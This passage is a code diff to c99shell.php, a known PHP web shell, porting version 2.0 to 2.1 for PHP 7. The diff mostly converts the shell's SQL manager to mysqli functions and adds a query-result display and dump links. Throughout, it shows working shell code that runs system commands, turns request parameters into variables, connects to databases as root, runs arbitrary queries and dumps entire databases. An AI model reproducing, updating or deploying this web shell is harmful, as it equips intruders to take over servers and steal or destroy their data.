@@ -1,12 +1,12 @@
 <?php 
 /*
-******************************************************************************************************
-       ________  ________    _________.__           .__  .__             ________     _______   
-  ____/   __   \/   __   \  /   _____/|  |__   ____ |  | |  |   ___  __  \_____  \    \   _  \  
-_/ ___\____    /\____    /  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ /   /  ____/    /  /_\  \ 
-\  \___  /    /    /    /   /        \|   Y  \  ___/|  |_|  |__  \   /   /       \    \  \_/   \
- \___  >/____/    /____/   /_______  /|___|  /\___  >____/____/   \_/ /\ \_______ \ /\ \_____  /
-     \/                            \/      \/     \/                  \/         \/ \/       \/ 
+*************************************************************************************************************
+       ________  ________    _________.__           .__  .__             ________      ____ 
+  ____/   __   \/   __   \  /   _____/|  |__   ____ |  | |  |   ___  __  \_____  \    /_   |
+_/ ___\____    /\____    /  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ /   /  ____/     |   |
+\  \___  /    /    /    /   /        \|   Y  \  ___/|  |_|  |__  \   /   /       \     |   |
+ \___  >/____/    /____/   /_______  /|___|  /\___  >____/____/   \_/ /\ \_______ \ /\ |___|
+     \/                            \/      \/     \/                  \/         \/ \/      
  _             _   __      _               _                 _      
 | |           | | / /     (_)             | |               (_)     
 | |__  _   _  | |/ /  __ _ _ _______ _ __ | |     ___  _   _ _  ___ 
@@ -15,9 +15,9 @@ _/ ___\____    /\____    /  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ /   /  ___
 |_.__/ \__, | \_| \_/\__,_|_/___\___|_| |_\_____/\___/ \__,_|_|\___|
         __/ |                                                       
        |___/                                                        
-*			c99shell.php v.2.0 (PHP 7) (25.02.2019) Updated by: KaizenLouie for PHP 7
+*			c99shell.php v.2.1 (PHP 7) (1.12.2019) Updated by: KaizenLouie for PHP 7, cermmik for MySQL
 *			https://github.com/KaizenLouie/C99Shell-PHP7
-******************************************************************************************************
+*************************************************************************************************************
 */
 
 if (!function_exists("getmicrotime"))
@@ -64,7 +64,7 @@ foreach ($_REQUEST as $k => $v)
         $$k = $v;
     }
 }
-$shver = "2.0 [PHP 7 Update] [25.02.2019]";
+$shver = "2.1 [PHP 7 Update] [1.12.2019]";
 if (!empty($unset_surl))
 {
     setcookie("c99sh_surl");
@@ -1107,9 +1107,9 @@ if ($act != "img")
             }
         }
     }
-    if (!function_exists("mysql_dump"))
+    if (!function_exists("mysqli_dump"))
     {
-        function mysql_dump($set)
+        function mysqli_dump($set)
         {
             global $shver;
             $sock = $set["sock"];
@@ -1156,10 +1156,10 @@ if ($act != "img")
             }
             if (sizeof($tabs) == 0)
             {
-                $res = mysql_query("SHOW TABLES FROM " . $db, $sock);
-                if (mysql_num_rows($res) > 0)
+                $res = mysqli_query($sock, "SHOW TABLES FROM " . $db);
+                if (mysqli_num_rows($res) > 0)
                 {
-                    while ($row = mysql_fetch_row($res))
+                    while ($row = mysqli_fetch_row($res))
                     {
                         $tabs[] = $row[0];
                     }
@@ -1169,7 +1169,7 @@ if ($act != "img")
 					# Home page: https://github.com/KaizenLouie/C99Shell-PHP7
 					#
 					# Host settings:
-					# MySQL version: (" . mysql_get_server_info() . ") running on " . getenv("SERVER_ADDR") . " (" . getenv("SERVER_NAME") . ")" . "
+					# MySQL version: (" . mysqli_get_server_info() . ") running on " . getenv("SERVER_ADDR") . " (" . getenv("SERVER_NAME") . ")" . "
 					# Date: " . date("d.m.Y H:i:s") . "
 					# DB: \"" . $db . "\"
 					#---------------------------------------------------------
@@ -1183,19 +1183,19 @@ if ($act != "img")
                     {
                         $out .= "DROP TABLE IF EXISTS `" . $tab . "`;\n";
                     }
-                    $res = mysql_query("SHOW CREATE TABLE `" . $tab . "`", $sock);
+                    $res = mysqli_query($sock, "SHOW CREATE TABLE `" . $tab . "`");
                     if (!$res)
                     {
-                        $ret["err"][] = mysql_smarterror();
+                        $ret["err"][] = mysqli_smarterror($sock);
                     }
                     else
                     {
-                        $row = mysql_fetch_row($res);
+                        $row = mysqli_fetch_row($res);
                         $out .= $row["1"] . ";\n\n";
-                        $res = mysql_query("SELECT * FROM `$tab`", $sock);
-                        if (mysql_num_rows($res) > 0)
+                        $res = mysqli_query($sock, "SELECT * FROM `$tab`");
+                        if (mysqli_num_rows($res) > 0)
                         {
-                            while ($row = mysql_fetch_assoc($res))
+                            while ($row = mysqli_fetch_assoc($res))
                             {
                                 $keys = implode("`, `", array_keys($row));
                                 $values = array_values($row);
@@ -1239,9 +1239,9 @@ if ($act != "img")
             return $out;
         }
     }
-    if (!function_exists("mysql_buildwhere"))
+    if (!function_exists("mysqli_buildwhere"))
     {
-        function mysql_buildwhere($array, $sep = " and", $functs = array())
+        function mysqli_buildwhere($array, $sep = " and", $functs = array())
         {
             if (!is_array($array))
             {
@@ -1266,46 +1266,54 @@ if ($act != "img")
             return $result;
         }
     }
-    if (!function_exists("mysql_fetch_all"))
+    if (!function_exists("mysqli_fetch_all"))
     {
-        function mysql_fetch_all($query, $sock)
+        function mysqli_fetch_all($sock, $query)
         {
             if ($sock)
             {
-                $result = mysql_query($query, $sock);
+                $result = mysqli_query($sock, $query);
             }
             else
             {
-                $result = mysql_query($query);
+                $result = mysqli_query($query);
             }
             $array = array();
-            while ($row = mysql_fetch_array($result))
+            while ($row = mysqli_fetch_array($result))
             {
                 $array[] = $row;
             }
-            mysql_free_result($result);
+            mysqli_free_result($result);
             return $array;
         }
     }
-    if (!function_exists("mysql_smarterror"))
+    if (!function_exists("mysqli_field_name"))
     {
-        function mysql_smarterror($type, $sock)
+        function mysqli_field_name($result, $field_offset)
+        {
+            $properties = mysqli_fetch_field_direct($result, $field_offset);
+            return is_object($properties) ? $properties->name : null;
+        }
+    }
+    if (!function_exists("mysqli_smarterror"))
+    {
+        function mysqli_smarterror($sock)
         {
             if ($sock)
             {
-                $error = mysql_error($sock);
+                $error = mysqli_error($sock);
             }
             else
             {
-                $error = mysql_error();
+                $error = mysqli_error();
             }
             $error = htmlspecialchars($error);
             return $error;
         }
     }
-    if (!function_exists("mysql_query_form"))
+    if (!function_exists("mysqli_query_form"))
     {
-        function mysql_query_form()
+        function mysqli_query_form()
         {
             global $submit, $sql_act, $sql_query, $sql_query_result, $sql_confirm, $sql_query_error, $tbl_struct;
             if (($submit) and (!$sql_query_result) and ($sql_confirm))
@@ -1349,24 +1357,24 @@ if ($act != "img")
             }
         }
     }
-    if (!function_exists("mysql_create_db"))
+    if (!function_exists("mysqli_create_db"))
     {
-        function mysql_create_db($db, $sock = "")
+        function mysqli_create_db($sock = "", $db)
         {
             $sql = "CREATE DATABASE `" . addslashes($db) . "`;";
             if ($sock)
             {
-                return mysql_query($sql, $sock);
+                return mysqli_query($sock, $sql);
             }
             else
             {
-                return mysql_query($sql);
+                return mysqli_query($sql);
             }
         }
     }
-    if (!function_exists("mysql_query_parse"))
+    if (!function_exists("mysqli_query_parse"))
     {
-        function mysql_query_parse($query)
+        function mysqli_query_parse($query)
         {
             $query = trim($query);
             $arr = explode(" ", $query);
@@ -1607,7 +1615,7 @@ if ($act != "img")
     }
     $dspact = $act = htmlspecialchars($act);
     $disp_fullpath = $ls_arr = $notls = null;
-    $ud = urlencode($d); ?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99Shell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname() , 90, "<br>", 1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win)
+    $ud = urlencode($d); ?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99Shell v.<?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname() , 90, "<br>", 1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win)
     {
         echo wordwrap(myshellexec("id") , 90, "<br>", 1);
     }
@@ -1767,15 +1775,15 @@ if ($act != "img")
         {
             $sql_surl .= "&sql_db=" . htmlspecialchars($sql_db);
         }
-        $sql_surl .= "&"; ?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php if ($sql_server)
+        $sql_surl .= "&";?><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php if ($sql_server)
         {
-            $sql_sock = mysql_connect($sql_server . ":" . $sql_port, $sql_login, $sql_passwd);
-            $err = mysql_smarterror();
-            @mysql_select_db($sql_db, $sql_sock);
+            $sql_sock = mysqli_connect($sql_server . ":" . $sql_port, $sql_login, $sql_passwd);
+            $err = mysqli_smarterror($sql_sock);
+            mysqli_select_db($sql_sock, $sql_db);
             if ($sql_query and $submit)
             {
-                $sql_query_result = mysql_query($sql_query, $sql_sock);
-                $sql_query_error = mysql_smarterror();
+                $sql_query_result = mysqli_query($sql_sock, $sql_query);
+                $sql_query_error = mysqli_smarterror($sql_sock);
             }
         }
         else
@@ -1822,7 +1830,7 @@ if ($act != "img")
                 "Logout",
                 $surl . "act=sql"
             );
-            echo "<center><b>MySQL " . mysql_get_server_info() . " (proto v." . mysql_get_proto_info() . ") running in " . htmlspecialchars($sql_server) . ":" . htmlspecialchars($sql_port) . " as " . htmlspecialchars($sql_login) . "@" . htmlspecialchars($sql_server) . " (password - \"" . htmlspecialchars($sql_passwd) . "\")</b><br>";
+            echo "<center><b>MySQL " . mysqli_get_server_info() . " (proto v." . mysqli_get_proto_info() . ") running in " . htmlspecialchars($sql_server) . ":" . htmlspecialchars($sql_port) . " as " . htmlspecialchars($sql_login) . "@" . htmlspecialchars($sql_server) . " (password - \"" . htmlspecialchars($sql_passwd) . "\")</b><br>";
             if (count($sqlquicklaunch) > 0)
             {
                 foreach ($sqlquicklaunch as $item)
@@ -1834,26 +1842,26 @@ if ($act != "img")
         }
         echo "</td></tr><tr>";
         if (!$sql_sock)
-        { ?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php
+        { ?><td width="28%" height="100" valign="top"><center><font size="5"> Info </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="text" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php
         }
         else
         {
             if (!empty($sql_db))
-            { ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl . "act=sql&sql_login=" . htmlspecialchars($sql_login) . "&sql_passwd=" . htmlspecialchars($sql_passwd) . "&sql_server=" . htmlspecialchars($sql_server) . "&sql_port=" . htmlspecialchars($sql_port) . "&"; ?>"><b>Home</b></a><hr size="1" noshade><?php $result = mysql_list_tables($sql_db);
+            { ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl . "act=sql&sql_login=" . htmlspecialchars($sql_login) . "&sql_passwd=" . htmlspecialchars($sql_passwd) . "&sql_server=" . htmlspecialchars($sql_server) . "&sql_port=" . htmlspecialchars($sql_port) . "&"; ?>"><b>Home</b></a><hr size="1" noshade><?php $result = mysqli_query($sql_sock, "SHOW TABLES IN " . $sql_db);
                 if (!$result)
                 {
-                    echo mysql_smarterror();
+                    echo mysqli_smarterror($sql_sock);
                 }
                 else
                 {
                     echo "---[ <a href=\"" . $sql_surl . "&\"><b>" . htmlspecialchars($sql_db) . "</b></a> ]---<br>";
                     $c = 0;
-                    while ($row = mysql_fetch_array($result))
+                    while ($row = mysqli_fetch_array($result))
                     {
-                        $count = mysql_query("SELECT COUNT(*) FROM " . $row[0]);
-                        $count_row = mysql_fetch_array($count);
+                        $count = mysqli_query($sql_sock, "SELECT COUNT(*) FROM " . $row[0]);
+                        $count_row = mysqli_fetch_array($count);
                         echo "<b>»&nbsp;<a href=\"" . $sql_surl . "sql_db=" . htmlspecialchars($sql_db) . "&sql_tbl=" . htmlspecialchars($row[0]) . "\"><b>" . htmlspecialchars($row[0]) . "</b></a> (" . $count_row[0] . ")</br></b>";
-                        mysql_free_result($count);
+                        mysqli_free_result($count);
                         $c++;
                     }
                     if (!$c)
@@ -1863,15 +1871,15 @@ if ($act != "img")
                 }
             }
             else
-            { ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php $result = mysql_list_dbs($sql_sock);
+            { ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php $result = mysqli_query($sql_sock, "SHOW DATABASES");
                 if (!$result)
                 {
-                    echo mysql_smarterror();
+                    echo mysqli_smarterror($sql_sock);
                 }
                 else
                 { ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php $c = 0;
                     $dbs = "";
-                    while ($row = mysql_fetch_row($result))
+                    while ($row = mysqli_fetch_row($result))
                     {
                         $dbs .= "<option value=\"" . $row[0] . "\"";
                         if ($sql_db == $row[0])
@@ -1988,13 +1996,13 @@ if ($act != "img")
                     $sql_query = "";
                     if (!empty($boxrow_all))
                     {
-                        $sql_query = "DELETE * FROM `" . $sql_tbl . "`;";
+                        $sql_query = "DELETE FROM `" . $sql_tbl . "`;";
                     }
                     else
                     {
                         foreach ($boxrow as $v)
                         {
-                            $sql_query .= "DELETE * FROM `" . $sql_tbl . "` WHERE" . $v . " LIMIT 1;\n";
+                            $sql_query .= "DELETE FROM `" . $sql_tbl . "` WHERE" . $v . " LIMIT 1;\n";
                         }
                         $sql_query = substr($sql_query, 0, -1);
                     }
@@ -2040,10 +2048,10 @@ if ($act != "img")
                     }
                     elseif ($sql_tbl_insert_radio == 2)
                     {
-                        $set = mysql_buildwhere($sql_tbl_insert, ", ", $sql_tbl_insert_functs);
+                        $set = mysqli_buildwhere($sql_tbl_insert, ", ", $sql_tbl_insert_functs);
                         $sql_query = "UPDATE `" . $sql_tbl . "` SET " . $set . " WHERE " . $sql_tbl_insert_q . " LIMIT 1;";
-                        $result = mysql_query($sql_query) or print (mysql_smarterror());
-                        $result = mysql_fetch_array($result, MYSQL_ASSOC);
+                        $result = mysqli_query($sql_sock, $sql_query) or print (mysqli_smarterror($sql_sock));
+                        $result = mysqli_fetch_array($result, MYSQL_ASSOC);
                         $sql_act = "query";
                         $sql_tbl_act = "browse";
                     }
@@ -2074,24 +2082,45 @@ if ($act != "img")
                         {
                             echo "SQL-Query :";
                         }
-                        echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">" . htmlspecialchars($sql_query) . "</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"" . htmlspecialchars($sql_tbl) . "\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"" . htmlspecialchars($sql_goto) . "\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";
+                        echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">" . htmlspecialchars($sql_query) . "</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"" . htmlspecialchars($sql_tbl) . "\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"" . htmlspecialchars($sql_goto) . "\"><input type=\"submit\" name=\"sql_confirm\" value=\"Submit\">&nbsp;<input type=\"submit\" value=\"Cancel\"></form></td></tr></table>";
+                        echo "<br><hr size=\"1\" noshade>";
+                    }
+                    if ($submit and $sql_query_result and $sql_confirm)
+                    {
+                        echo "<b>Query result:</b> <br><br><table rules=\"rows\" bordercolordark=\"#666666\" bordercolorlight=\"#c0c0c0\" width=\"15%\" cellspacing=\"0\" cellpadding=\"5\" border=\"0\" bgcolor=\"#333333\"><tbody>";
+                        $check = 0;
+                        while ($row = mysqli_fetch_array($sql_query_result, MYSQLI_NUM))
+                        {
+                            $check = 1;
+                            echo "<tr>";
+                            foreach ($row as $r)
+                            {
+                                echo "<td>$r</td>";
+                            }
+                            echo "</tr>";
+                        }
+                        if ($check == 0)
+                        {
+                            echo "<tr><td>Query OK, no results to show</td></tr>";
+                        }
+                        echo "</tbody></table><br><br><hr size=\"1\" noshade>";
                     }
                 }
                 if (in_array($sql_act, $acts))
-                { ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_" . getenv("SERVER_NAME") . "_" . $sql_db . "_" . date("d-m-Y-H-i-s") . ".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php if (!empty($sql_act))
+                { ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_" . getenv("SERVER_NAME") . "_" . $sql_db . "_" . date("d-m-Y-H-i-s") . ".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php if (!empty($sql_act))
                     {
                         echo "<hr size=\"1\" noshade>";
                     }
                     if ($sql_act == "newtbl")
                     {
                         echo "<b>";
-                        if ((mysql_create_db($sql_newdb)) and (!empty($sql_newdb)))
+                        if ((mysqli_create_db($sql_sock, $sql_newdb)) and (!empty($sql_newdb)))
                         {
                             echo "DB \"" . htmlspecialchars($sql_newdb) . "\" has been created with success!</b><br>";
                         }
                         else
                         {
-                            echo "Can't create DB \"" . htmlspecialchars($sql_newdb) . "\".<br>Reason:</b> " . mysql_smarterror();
+                            echo "Can't create DB \"" . htmlspecialchars($sql_newdb) . "\".<br>Reason:</b> " . mysqli_smarterror($sql_sock);
                         }
                     }
                     elseif ($sql_act == "dump")
@@ -2099,6 +2128,12 @@ if ($act != "img")
                         if (empty($submit))
                         {
                             $diplay = false;
+                            echo "<br>";
+                            //echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+                            echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+                            echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+                            echo "<a href=\"" . $sql_surl . "sql_tbl=" . urlencode($sql_tbl) . "&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+                            echo "<hr size=\"1\" noshade><br>";
